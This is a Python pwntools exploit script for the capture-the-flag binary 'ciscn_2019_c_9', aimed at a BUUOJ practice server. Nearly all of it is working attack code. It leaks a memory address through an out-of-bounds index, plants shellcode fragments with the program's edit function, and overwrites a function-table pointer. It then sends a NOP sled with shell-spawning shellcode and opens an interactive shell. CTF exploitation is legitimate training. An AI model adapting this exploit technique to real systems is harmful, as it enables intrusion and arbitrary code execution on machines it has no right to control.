# -*- encoding: utf-8 -*-
import sys 
import os 
import requests
from pwn import * 
binary = './ciscn_2019_c_9'
os.system('chmod +x %s'%binary)
context.binary = binary
context.log_level = 'debug'
elf = ELF(binary)
libc = elf.libc
# libc = ELF('')
DEBUG = 0
if DEBUG:
    libc = elf.libc
    p = process(binary)
    # p = process(['qemu-arm', binary])
    # p = process(['qemu-arm','-g','1234', binary])
    # p = process(['qemu-aarch64','-L','','-g','1234',binary])
else:
    host = 'node4.buuoj.cn'
    port = '26963'
    p = remote(host,port)

l64 = lambda            : ras(u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00')))
l32 = lambda            : ras(u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00')))
uu64= lambda a          : ras(u64(p.recv(a).ljust(8,'\x00')))
uu32= lambda a          : ras(u32(p.recv(a).ljust(4,'\x00')))
rint= lambda x = 12     : ras(int( p.recv(x) , 16))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': \033[1;36m 0x%x \033[0m' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))

def ras( data ):
    lg('leak' , data)
    return data

def dbg( b = null):
    if (b == null):
        gdb.attach(p)
        pause()
    else:
        gdb.attach(p,'b %s'%b)

def one_gadget(filename):
    log.success('Leak One_Gadgets...')
    one_ggs = str(subprocess.check_output(['one_gadget','--raw', '-f',filename])).split(' ')
    return list(map(int,one_ggs))

def cmd(num):
    sla(':',num)

def add( text = 'a'):
    cmd(2)
    sa('WeaponName:' , text)

def edit(idx , text):
    cmd(3)
    sla('id:' , idx)
    sa('Name:' , text)

def show(idx ):
    cmd(4)
    sla('show?\n' , idx)

def charge(num ):
    cmd(1)
    sla('stronger:' , num)

# one_gad = one_gadget(libc.path)
# shellcode 中善用 $

def attack():
    
    charge(30)
    add('a')
    # dbg()
    shellcode1 = '''
    xchg rsi,rdi
    xor eax,eax
    nop
    jmp $+6
    '''

    edit(0,asm(shellcode1))

    shellcode2 = '''
    xor rdx,rdx
    mov dl,0xff
    syscall
    '''

    edit(1,  asm(shellcode2))

    show(-1)
    ru('Weapon name is:')
    addr = uu64(6) & 0xfffffffff000
    fake_table = addr + 0x1088

    lg('fake_table' , fake_table)

    edit(-1 , p64(fake_table))

    # dbg()
    cmd(2)
    se( '\x90'*0x50 +  asm(shellcraft.sh()))


    # p.success(getShell())
    p.interactive()

attack()

'''
@File    :   ciscn_2019_c_9.py
@Time    :   2022/02/11 19:55:36
@Author  :   Niyah 
'''
